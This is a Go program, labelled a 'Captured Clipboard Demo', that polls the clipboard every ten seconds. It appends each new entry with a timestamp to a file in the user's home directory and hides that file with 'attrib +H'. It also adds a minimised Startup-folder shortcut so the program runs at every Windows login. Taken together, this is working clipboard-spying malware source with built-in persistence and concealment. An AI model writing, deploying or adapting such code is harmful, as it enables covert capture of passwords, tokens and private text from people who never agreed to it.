package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/atotto/clipboard"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func main() {
	fmt.Println("Captured Clipboard Demo")

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	// Determine hidden file path in user's home directory
	homeDir, err := os.UserHomeDir()
	check(err)

	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")

	// Set up persistence at boot-time (windows)
	err = setupPersistence()
	check(err)

	// Create the .clipboard_capture file
	f, err := os.OpenFile(hiddenFile, os.O_CREATE|os.O_WRONLY, 0600)
	check(err)
	f.Close()

	// Hide the .clipboard_capture file on Windows
	if runtime.GOOS == "windows" {
		err := hideFile(hiddenFile)
		check(err)
	}
	
	// Start reading clipboard
	readClipboard(ticker, hiddenFile)
}

// readClipboard polls the clipboard at intervals and stores new clipboard data to disk
func readClipboard(ticker *time.Ticker, hiddenFile string) {
	var last string

	for {
		txt, err := clipboard.ReadAll()
		check(err)

		if txt != last {
			fmt.Printf("[%s]: %q\n", time.Now().Format(time.RFC3339), summarize(txt))
			last = txt
			if last != "" {
				storeClipboard(hiddenFile, last)
			}
		}
		<-ticker.C //wait for next tick
	}
}

// storeClipboard appends clipboard data to .clipboard_capture file
func storeClipboard(path, data string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	check(err)

	defer f.Close()
	timestamp := time.Now().Format(time.RFC3339)
	entry := fmt.Sprintf("[%s]: %s\n", timestamp, data)
	_, err = f.WriteString(entry)
	check(err)
}

// setupPersistence ensures the Startup folder exists and creates a shortcut to the binary
func setupPersistence() error {
	appData := os.Getenv("APPDATA")
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		err = os.MkdirAll(startupDir, 0755)
		check(err)
	}
	exePath, err := os.Executable()
	check(err)

	shortcutPath := filepath.Join(startupDir, "capture-clipboard.lnk")
	if _, err := os.Stat(shortcutPath); err == nil {
		return nil // Shortcut already exists, do nothing
	}
	return createShortcut(exePath, shortcutPath)
}

// createShortcut creates a .lnk shortcut in the Startup folder pointing to exePath
func createShortcut(exePath, shortcutPath string) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	shellObj, err := oleutil.CreateObject("WScript.Shell")
	check(err)
	defer shellObj.Release()

	shell, err := shellObj.QueryInterface(ole.IID_IDispatch)
	check(err)
	defer shell.Release()

	shortcut, err := oleutil.CallMethod(shell, "CreateShortcut", shortcutPath)
	check(err)
	defer shortcut.Clear()

	sc := shortcut.ToIDispatch()
	_, err = oleutil.PutProperty(sc, "TargetPath", exePath)
	check(err)
	_, err = oleutil.PutProperty(sc, "WorkingDirectory", filepath.Dir(exePath))
	check(err)
	_, err = oleutil.PutProperty(sc, "WindowStyle", 7)
	check(err)
	_, err = oleutil.PutProperty(sc, "Description", "Clipboard Capture")
	check(err)
	_, err = oleutil.CallMethod(sc, "Save")
	check(err)

	return nil
}

// hideFile sets the hidden attribute on a file in Windows
func hideFile(path string) error {
	cmd := exec.Command("attrib", "+H", path)
	return cmd.Run()
}

// check panics or exits if err is non-nil
func check(err error) {
	if err != nil {
		panic(err)
	}
}

// summarize truncates long clipboard strings for readable output
func summarize(s string) string {
	// Keep output readable: show up to 300 chars
	if len(s) > 300 {
		return s[:300] + "...(truncated)"
	}
	return s
}

// // hideFile sets the hidden attribute on a file in Windows (used if build from Windows)
// func hideFile(path string) error{
// 	if runtime.GOOS != "windows" {
// 		path, err := syscall.UTF16PtrFromString(path)
// 		err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN)
// 		check(err)
// 	}
// 	return nil
// }

